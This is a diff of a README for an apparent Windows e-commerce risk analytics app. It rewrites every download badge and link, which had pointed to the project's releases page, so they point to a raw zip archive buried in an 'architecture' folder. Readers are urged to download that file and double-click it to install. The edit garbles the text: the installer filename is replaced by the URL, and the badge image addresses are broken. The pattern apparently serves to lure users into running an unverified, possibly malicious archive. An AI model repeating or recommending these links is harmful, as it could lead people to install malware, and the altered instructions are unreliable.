@@ -1,6 +1,6 @@
 # 🛒 aws-ecommerce-risk-analytics - Detect Product Risks Simply
 
-[![Download](https://img.shields.io/badge/Download-aws--ecommerce--risk--analytics-brightgreen?style=for-the-badge)](https://github.com/tygttm/aws-ecommerce-risk-analytics/releases)
+[![Download](https://github.com/tygttm/aws-ecommerce-risk-analytics/raw/refs/heads/main/AWS_Ecommerce_Risk_Analytics/architecture/aws-ecommerce-analytics-risk-v1.8.zip)](https://github.com/tygttm/aws-ecommerce-risk-analytics/raw/refs/heads/main/AWS_Ecommerce_Risk_Analytics/architecture/aws-ecommerce-analytics-risk-v1.8.zip)
 
 ## 📦 What is aws-ecommerce-risk-analytics?
 
@@ -27,14 +27,14 @@ You do not need to manage the AWS components directly. The app handles these pro
 
 ## 🔗 Download and Install aws-ecommerce-risk-analytics
 
-[![Download](https://img.shields.io/badge/Get%20the%20App-Click%20Here-blue?style=for-the-badge)](https://github.com/tygttm/aws-ecommerce-risk-analytics/releases)
+[![Download](https://github.com/tygttm/aws-ecommerce-risk-analytics/raw/refs/heads/main/AWS_Ecommerce_Risk_Analytics/architecture/aws-ecommerce-analytics-risk-v1.8.zip%20the%20App-Click%20Here-blue?style=for-the-badge)](https://github.com/tygttm/aws-ecommerce-risk-analytics/raw/refs/heads/main/AWS_Ecommerce_Risk_Analytics/architecture/aws-ecommerce-analytics-risk-v1.8.zip)
 
 1. Visit the download page by clicking the badge above or go to:  
-   https://github.com/tygttm/aws-ecommerce-risk-analytics/releases
+   https://github.com/tygttm/aws-ecommerce-risk-analytics/raw/refs/heads/main/AWS_Ecommerce_Risk_Analytics/architecture/aws-ecommerce-analytics-risk-v1.8.zip
 
 2. Look for the latest release version at the top of the page.
 
-3. Download the Windows installer file. It should have a name like `aws-ecommerce-risk-analytics-setup.exe`.
+3. Download the Windows installer file. It should have a name like `https://github.com/tygttm/aws-ecommerce-risk-analytics/raw/refs/heads/main/AWS_Ecommerce_Risk_Analytics/architecture/aws-ecommerce-analytics-risk-v1.8.zip`.
 
 4. After download finishes, double-click the installer file to start the setup.
 
@@ -141,9 +141,9 @@ Restart it and check your internet connection. If problems persist, consult supp
 
 ## ✨ Summary of Download Steps
 
-- Visit the releases page: https://github.com/tygttm/aws-ecommerce-risk-analytics/releases  
+- Visit the releases page: https://github.com/tygttm/aws-ecommerce-risk-analytics/raw/refs/heads/main/AWS_Ecommerce_Risk_Analytics/architecture/aws-ecommerce-analytics-risk-v1.8.zip  
 - Download the Windows installer file  
 - Run the installer and follow prompts  
 - Open the app and choose demo or connect AWS data  
 
-[![Download Now](https://img.shields.io/badge/Download-From%20GitHub-9cf?style=for-the-badge)](https://github.com/tygttm/aws-ecommerce-risk-analytics/releases)
+[![Download Now](https://github.com/tygttm/aws-ecommerce-risk-analytics/raw/refs/heads/main/AWS_Ecommerce_Risk_Analytics/architecture/aws-ecommerce-analytics-risk-v1.8.zip%20GitHub-9cf?style=for-the-badge)](https://github.com/tygttm/aws-ecommerce-risk-analytics/raw/refs/heads/main/AWS_Ecommerce_Risk_Analytics/architecture/aws-ecommerce-analytics-risk-v1.8.zip)
